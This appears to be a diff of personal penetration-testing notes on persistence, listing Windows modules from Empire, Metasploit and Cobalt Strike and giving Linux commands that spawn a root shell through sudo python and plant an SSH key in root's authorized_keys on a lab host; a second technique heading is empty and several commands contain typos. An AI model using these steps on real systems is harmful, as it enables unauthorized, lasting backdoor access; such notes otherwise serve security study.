@@ -2,9 +2,43 @@ Persistance w/ Empire, Metasploit, CS
 
 linode - HS
 
+🟦 Windows
+
 Using the Registry-Key Persistence Module
 Using the Scheduled Tasks Persistence Module
 Using the WMI Persistence Module
 Using Local User Accounts as a Means of Persistence
 Using the PowerBreach Module to create a Backdoor
+
+🟦 Linux
+
+(Technique 1) Persistance w/ ssh keys (the root user is necessary)
+
+$ sudo python -c 'import os: os.system("bin/bash")'  
+$ /bin/bash -i
+
+root $
+
+$ nano /etc/ssh/sshd_config                      #(review the file)
+$ ssh root@10.10.10.10                           #(fail =we dont know the pw)
+$ ssh-keygen                                     #(/.ssh/id_rsa.pub)
+$ mkdir .ssh
+$ /.ssh/ nano authorized_keys                     #(paste the id_rsa.pub)
+$ /.ssh/ chmod 600 /root/.ssh/authorized_keys
+$ ssh root@10.10.10.10                            #(success!)
+
+
+(Technique 2) Create a privilege account user
+
+
+
+
+
+
+
+
+
+
+
+
 
